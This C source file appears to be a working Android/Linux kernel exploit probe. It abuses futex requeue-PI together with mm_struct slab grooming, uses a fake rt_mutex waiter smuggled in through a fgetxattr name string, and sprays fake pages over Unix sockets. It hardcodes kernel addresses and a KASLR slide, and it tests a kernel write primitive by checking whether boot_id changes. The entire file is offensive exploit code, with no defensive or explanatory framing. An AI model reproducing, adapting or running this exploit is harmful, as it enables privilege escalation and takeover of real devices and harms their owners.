/* t3_probe.c — G5/T3 v2：页级复用 + 写原语（修正 NUL 偏移 + warm-up 丢弃门控）
 *
 * 关键修正：
 *  - fake lock / V / V2 的页内偏移在运行时选择，保证这些内核地址的 8 字节全非零
 *    （NUL 约束：fgetxattr 的 name 串不能含 0x00）。
 *  - groom 用 warm 576（32 slabs）把 mm cache 的 partial 抬起来，再 pre/leak/post；
 *    杀 leak 后比较 slabdata，只有确实发生 discard 才进入触发，否则重试/放弃。
 *  - 触发前校验 carrier 全字节非零，避免把半截 waiter 写进栈。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>

#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

#define BOOT_ID_STATIC       0xffffff800a147200ULL  /* random_table boot_id[16] */
#define SLIDE                0x120600000ULL         /* 2026-11-20 19:49 boot (pc=ffffff97eeadcb68) */
#define BOOT_ID_RT           (BOOT_ID_STATIC + SLIDE)

#define PAGE_DECOY_OFF  0x200
#define XATTR_BOFF      0x10

static int logfd = -1;
static void lg(const char *fmt, ...) {
    char buf[400];
    va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    dprintf(1, "%s\n", buf);
    if (logfd >= 0) { dprintf(logfd, "%s\n", buf); fsync(logfd); }
}

static uint64_t mm_page;
static uint64_t Q;
static uint64_t g_lock_off, g_v_off, g_v2_off;
static uint64_t V, V2;
static char carrier[256];
static int carrier_len;
static volatile int carrier_done;
static volatile int w_tid;
static volatile int x_ready;
static int fgetx_fd = -1;
static int nocarrier = 0;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}
static void pin0(void) { cpu_set_t s; CPU_ZERO(&s); CPU_SET(0, &s); sched_setaffinity(0, sizeof(s), &s); }
static void put64(unsigned char *p, uint64_t off, uint64_t v) { memcpy(p + off, &v, 8); }
static void put32(unsigned char *p, uint64_t off, uint32_t v) { memcpy(p + off, &v, 4); }
static int has_zero(uint64_t v) {
    for (int i = 0; i < 8; i++) if (((v >> (8*i)) & 0xff) == 0) return 1;
    return 0;
}
static int overlaps(uint64_t a, uint64_t alen, uint64_t b, uint64_t blen) {
    return a < b + blen && b < a + alen;
}
static int pick_offsets(void) {
    for (uint64_t lo = 0x108; lo + 0x20 < 0x3f00; lo += 8) {
        if (has_zero(mm_page + lo)) continue;
        if (overlaps(lo, 0x20, PAGE_DECOY_OFF, 0x50)) continue;
        for (uint64_t vo = 0x108; vo + 0x18 < 0x3f00; vo += 8) {
            if (has_zero(mm_page + vo)) continue;
            if (overlaps(vo, 0x18, lo, 0x20)) continue;
            if (overlaps(vo, 0x18, PAGE_DECOY_OFF, 0x50)) continue;
            for (uint64_t v2o = 0x108; v2o + 0x18 < 0x3f00; v2o += 8) {
                if (has_zero(mm_page + v2o)) continue;
                if (overlaps(v2o, 0x18, lo, 0x20)) continue;
                if (overlaps(v2o, 0x18, PAGE_DECOY_OFF, 0x50)) continue;
                if (overlaps(v2o, 0x18, vo, 0x18)) continue;
                g_lock_off = lo; g_v_off = vo; g_v2_off = v2o;
                return 0;
            }
        }
    }
    return -1;
}

static void build_carrier(void) {
    memset(carrier, 0x01, sizeof(carrier));
    uint64_t fields[][2] = {
        {0x00, Q}, {0x08, V}, {0x10, V2},
        {0x18, 0x0101010101010101ULL}, {0x20, 0x0101010101010101ULL},
        {0x28, 0x0101010101010101ULL}, {0x30, 0x0101010101010101ULL},
        {0x38, mm_page + g_lock_off},
    };
    for (unsigned i = 0; i < sizeof(fields)/sizeof(fields[0]); i++)
        memcpy(carrier + XATTR_BOFF + fields[i][0], &fields[i][1], 8);
    carrier[XATTR_BOFF + 0x40] = 0x82;      /* prio=130 */
    carrier_len = XATTR_BOFF + 0x41;
    carrier[carrier_len] = 0;
    for (int i = 0; i < carrier_len; i++) {
        if (carrier[i] == 0) {
            lg("FATAL carrier[%d]==0（NUL 会截断，禁止触发）", i);
            _exit(2);
        }
    }
    lg("carrier ok len=%d lock=%016llx V=%016llx V2=%016llx Q=%016llx",
       carrier_len, (unsigned long long)(mm_page+g_lock_off),
       (unsigned long long)V, (unsigned long long)V2, (unsigned long long)Q);
}

static void build_page(unsigned char *p, size_t len) {
    memset(p, 0x41, len);
    uint64_t lock = mm_page + g_lock_off;
    uint64_t decoy = mm_page + PAGE_DECOY_OFF;
    uint64_t v = mm_page + g_v_off;
    uint64_t v2 = mm_page + g_v2_off;
    put32(p, g_lock_off + 0x00, 0);
    put64(p, g_lock_off + 0x08, decoy);
    put64(p, g_lock_off + 0x10, decoy);
    put64(p, g_lock_off + 0x18, 0);
    put64(p, PAGE_DECOY_OFF + 0x00, 1);
    put64(p, PAGE_DECOY_OFF + 0x08, 0);
    put64(p, PAGE_DECOY_OFF + 0x10, 0);
    put64(p, PAGE_DECOY_OFF + 0x18, 0x0101010101010101ULL);
    put64(p, PAGE_DECOY_OFF + 0x20, 0x0101010101010101ULL);
    put64(p, PAGE_DECOY_OFF + 0x28, 0x0101010101010101ULL);
    put64(p, PAGE_DECOY_OFF + 0x30, 0x0101010101010101ULL);
    put64(p, PAGE_DECOY_OFF + 0x38, lock);
    put32(p, PAGE_DECOY_OFF + 0x40, 120);
    put64(p, PAGE_DECOY_OFF + 0x48, 0);
    put64(p, g_v_off + 0x00, 0);
    put64(p, g_v_off + 0x08, v2);
    put64(p, g_v_off + 0x10, 0);
    put64(p, g_v2_off + 0x00, 0);
    put64(p, g_v2_off + 0x08, 0);
    put64(p, g_v2_off + 0x10, 0);
    lg("page lock_off=%#llx v_off=%#llx v2_off=%#llx lock=%016llx decoy=%016llx",
       (unsigned long long)g_lock_off, (unsigned long long)g_v_off,
       (unsigned long long)g_v2_off, (unsigned long long)lock, (unsigned long long)decoy);
}

static pid_t spawn_ksnitch(int *readfd) {
    int fd[2]; if (pipe(fd)) return -1;
    pid_t p = fork();
    if (p == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        dup2(fd[1], 1); close(fd[0]); close(fd[1]);
        execl("/data/local/tmp/ksnitch_k3", "ksnitch_k3", "--hold", (char *)NULL);
        _exit(127);
    }
    close(fd[1]); *readfd = fd[0];
    return p;
}
static uint64_t read_mm(int fd, int timeout_s) {
    FILE *f = fdopen(fd, "r"); if (!f) return 0;
    char line[512]; uint64_t mm = 0; time_t t0 = time(NULL);
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "MM ", 3) == 0) { mm = strtoull(line + 3, NULL, 16); break; }
        if (time(NULL) - t0 > timeout_s) break;
    }
    fclose(f);
    return mm;
}

static pid_t kids[2048]; static int nk;
static pid_t anchors[256]; static int nanchor;
static pid_t flushk[512]; static int nflush;
static void pause_child(void) { prctl(PR_SET_PDEATHSIG, SIGKILL); for (;;) pause(); }
static pid_t fork_pause(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) kids[nk++] = p; return p; }
static void killp(pid_t p) { if (p > 0) { kill(p, SIGKILL); waitpid(p, NULL, 0); } }
static pid_t fork_anchor(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) anchors[nanchor++] = p; return p; }
static pid_t fork_flush(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) flushk[nflush++] = p; return p; }
static void kill_anchors(void) { for (int i = 0; i < nanchor; i++) { if (anchors[i] > 0) killp(anchors[i]); anchors[i] = -1; } nanchor = 0; }
static void kill_flush(void) { for (int i = 0; i < nflush; i++) { if (flushk[i] > 0) killp(flushk[i]); flushk[i] = -1; } nflush = 0; }
static int spray_hold(const unsigned char *page, size_t len) {
    int nsock = 256, maxpkt = 16;
    int (*fds)[2] = calloc(nsock, sizeof(int[2]));
    char *buf = malloc(len); if (!fds || !buf) return 0;
    memcpy(buf, page, len);
    int ok = 0;
    for (int i = 0; i < nsock; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds[i]) < 0) { nsock = i; break; }
        int rcv = 2 * 1024 * 1024; setsockopt(fds[i][0], SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    }
    for (int i = 0; i < nsock; i++)
        for (int j = 0; j < maxpkt; j++) {
            ssize_t r = send(fds[i][0], buf, len, MSG_DONTWAIT);
            if (r == (ssize_t)len) ok++; else break;
        }
    lg("spray ok=%d (sockets=%d)", ok, nsock);
    return ok;
}

static void mm_counts(unsigned *act, unsigned *num, unsigned *sd) {
    FILE *f = fopen("/proc/slabinfo", "r");
    *act = *num = *sd = 0;
    if (!f) return;
    char line[256]; unsigned a=0,n=0,sd0=0,sdn=0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "mm_struct", 9) == 0) {
            sscanf(line, "%*s %u %u %*u %*u %*u : tunables %*u %*u %*u : slabdata %u %u %*u",
                   &a, &n, &sd0, &sdn);
            break;
        }
    }
    fclose(f);
    *act=a; *num=n; *sd=sd0;
}
static unsigned mm_slabdata(void) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return 0;
    char line[256]; unsigned act=0,num=0,sd=0,sdn=0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "mm_struct", 9) == 0) {
            sscanf(line, "%*s %u %u %*u %*u %*u : tunables %*u %*u %*u : slabdata %u %u %*u",
                   &act, &num, &sd, &sdn);
            break;
        }
    }
    fclose(f);
    lg("slabinfo mm_struct active=%u num=%u slabdata=%u/%u", act, num, sd, sdn);
    return sd;
}

/* 一次 groom；返回 0 成功，*before/*after 为 leak kill 前后的 slabdata */
static int groom_once(uint64_t *out_mm, unsigned *before, unsigned *after) {
    nk = 0;
    for (int i = 0; i < 576; i++) fork_pause();   /* warm: 32 slabs */
    for (int i = 0; i < 17; i++) fork_pause();
    int rfd; pid_t leak = spawn_ksnitch(&rfd);
    for (int i = 0; i < 18; i++) fork_pause();
    /* 5 个 anchor partial slab（每 slab 杀 1 个，留 17 个永远活着）→ flush 期间 nr_partial 恒 >=5 */
    nanchor = 0;
    for (int i = 0; i < 90; i++) fork_anchor();
    for (int i = 0; i < 5; i++) { int idx = i * 18; if (idx < nanchor) { killp(anchors[idx]); anchors[idx] = -1; } }
    /* 360 个 flush 代理：杀 leak 后全部释放，制造 CPU partial overflow 来 unfreeze/discard */
    nflush = 0;
    for (int i = 0; i < 360; i++) fork_flush();
    uint64_t mm = read_mm(rfd, 120);
    if (!mm || mm == (uint64_t)-1) {
        lg("leak failed");
        for (int i = 0; i < nk; i++) killp(kids[i]);
        nk = 0; killp(leak);
        return -1;
    }
    *out_mm = mm;
    for (int i = 0; i < nk; i++) killp(kids[i]);
    nk = 0;
    *before = mm_slabdata();
    killp(leak);                    /* L 空页先进 CPU partial */
    kill_flush();                   /* 大量释放，overflow CPU partial → unfreeze；anchor 保持 nr_partial>=5 */
    usleep(20 * 1000);
    *after = mm_slabdata();
    return 0;
}

struct shared { uint32_t A, B, C; volatile int b_held, c_held, o_blocked, w_waiting, w_returned; };

static void *thread_x(void *arg) {
    struct shared *S = arg;
    while (!S->c_held) sched_yield();
    x_ready = 1;
    lg("X: LOCK_PI(C) blocked");
    futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    lg("X: C returned");
    return NULL;
}
static void *thread_o(void *arg) {
    struct shared *S = arg;
    lg("O: LOCK_PI(C)");
    if (futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) { lg("O: C fail %d", errno); return NULL; }
    S->c_held = 1; __sync_synchronize();
    while (!S->b_held) sched_yield();
    S->o_blocked = 1; __sync_synchronize();
    lg("O: LOCK_PI(B) blocked");
    futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    lg("O: B returned");
    return NULL;
}
static void *thread_w(void *arg) {
    struct shared *S = arg;
    w_tid = syscall(SYS_gettid);
    lg("W: LOCK_PI(B)");
    if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) { lg("W: B fail %d", errno); return NULL; }
    S->b_held = 1; __sync_synchronize();
    while (!S->o_blocked) sched_yield();
    S->w_waiting = 1; __sync_synchronize();
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += 400 * 1000 * 1000;
    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    lg("W: WAIT_REQUEUE_PI(A→C, 400ms)");
    long r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
    lg("W: WAIT_REQUEUE_PI ret=%ld errno=%d", r, errno);
    S->w_returned = 1; __sync_synchronize();
    if (!nocarrier) {
        long e = syscall(SYS_fgetxattr, fgetx_fd, carrier, NULL, 0);
        lg("W: fgetxattr ret=%ld errno=%d", e, errno);
    } else {
        lg("W: [nocarrier] skip fgetxattr");
    }
    carrier_done = 1; __sync_synchronize();
    pause();
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    logfd = open("/data/local/tmp/t3.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    pin0();
    nocarrier = getenv("T3_NOCARRIER") != NULL;
    lg("== t3 v2 start uid=%d nocarrier=%d ==", getuid(), nocarrier);
    fgetx_fd = open("/dev/null", O_RDONLY);
    Q = BOOT_ID_RT - 0x10;

    uint64_t mm = 0; unsigned before = 0, after = 0; int ok = 0;
    if (nocarrier) { mm = 0; ok = 1; goto trigger; }
    for (int attempt = 0; attempt < 3; attempt++) {
        if (groom_once(&mm, &before, &after) == 0 && after < before) { ok = 1; break; }
        lg("groom attempt %d: no discard (before=%u after=%u)", attempt, before, after);
        kill_anchors(); kill_flush();
    }
    if (!ok) { lg("ABORT: no slab discard observed after 3 attempts"); kill_anchors(); kill_flush(); return 1; }
    mm_page = mm & ~0x3FFFULL;
    lg("accepted L=%016llx (discard %u -> %u)", (unsigned long long)mm_page, before, after);

    if (getenv("T3_PAGECHECK")) {
        for (int t = 0; t < 3; t++) {
            unsigned act=0, num=0, sd=0; mm_counts(&act, &num, &sd);
            unsigned free_objs = (num > act) ? (num - act) : 0;
            lg("PAGECHECK[%d] free_objs=%u (active=%u num=%u)", t, free_objs, act, num);
            if (free_objs > 300) free_objs = 300;
            for (unsigned i = 0; i < free_objs; i++) fork_pause();
            int rfd; pid_t pr = spawn_ksnitch(&rfd);
            uint64_t pmm = read_mm(rfd, 120);
            if (pmm) {
                uint64_t pp = pmm & ~0x3FFFULL;
                lg("PAGECHECK[%d] probe mm=%016llx page=%016llx %s L", t,
                   (unsigned long long)pmm, (unsigned long long)pp,
                   pp == mm_page ? "==" : "!=");
                killp(pr);
                if (pp == mm_page) { lg("PAGEOK"); return 0; }
            } else {
                lg("PAGECHECK[%d] probe mm=NA", t);
                killp(pr);
            }
        }
        lg("PAGECHECK done (no probe landed in L)");
        return 0;
    }

    if (has_zero(Q)) { lg("ABORT: Q has zero byte"); return 1; }
    if (pick_offsets() != 0) { lg("ABORT: no zero-free offsets"); return 1; }
    V = mm_page + g_v_off; V2 = mm_page + g_v2_off;
    build_carrier();

    size_t plen = 16064;
    unsigned char *page = malloc(plen);
    build_page(page, plen);
    int sp = spray_hold(page, plen);
    if (sp < 64) { lg("spray too small (%d)", sp); return 1; }

trigger:
    struct shared *S = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    S->A = S->B = S->C = 0;
    pthread_t tw, to, tx;
    pthread_create(&to, NULL, thread_o, S);
    while (!S->c_held) usleep(1000);
    pthread_create(&tx, NULL, thread_x, S);
    while (!x_ready) usleep(1000);
    usleep(50 * 1000);
    pthread_create(&tw, NULL, thread_w, S);
    while (!S->w_waiting || !S->o_blocked) usleep(1000);
    usleep(100 * 1000);
    lg("R: CMP_REQUEUE_PI(A→C,1)");
    long r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
    lg("R: CMP_REQUEUE_PI ret=%ld errno=%d", r, errno);
    for (int i = 0; i < 3000 && !carrier_done; i++) usleep(1000);
    lg("carrier_done=%d w_returned=%d", carrier_done, S->w_returned);
    if (!carrier_done) { lg("ABORT: carrier not reached"); return 1; }

    char before_id[64] = "?", after_id[64] = "?";
    FILE *kf = fopen("/proc/sys/kernel/random/boot_id", "r");
    if (kf) { fgets(before_id, sizeof(before_id), kf); fclose(kf); }
    struct sched_attr { uint32_t size, sched_policy; uint64_t sched_flags; int32_t sched_nice; uint32_t sched_priority; uint64_t sched_runtime, sched_deadline, sched_period; uint32_t sched_util_min, sched_util_max; } attr;
    memset(&attr, 0, sizeof(attr)); attr.size = 48; attr.sched_policy = 0; attr.sched_nice = 5;
    lg("trigger sched_setattr(tid=%d, nice=5) boot_id_before=%s", w_tid, before_id);
    long sr = syscall(SYS_sched_setattr, w_tid, &attr, 0);
    lg("sched_setattr ret=%ld errno=%d", sr, errno);
    kf = fopen("/proc/sys/kernel/random/boot_id", "r");
    if (kf) { fgets(after_id, sizeof(after_id), kf); fclose(kf); }
    lg("boot_id_after=%s", after_id);
    lg("RESULT %s", strcmp(before_id, after_id) != 0 ? "WROTE" : "NOCHANGE");
    return 0;
}
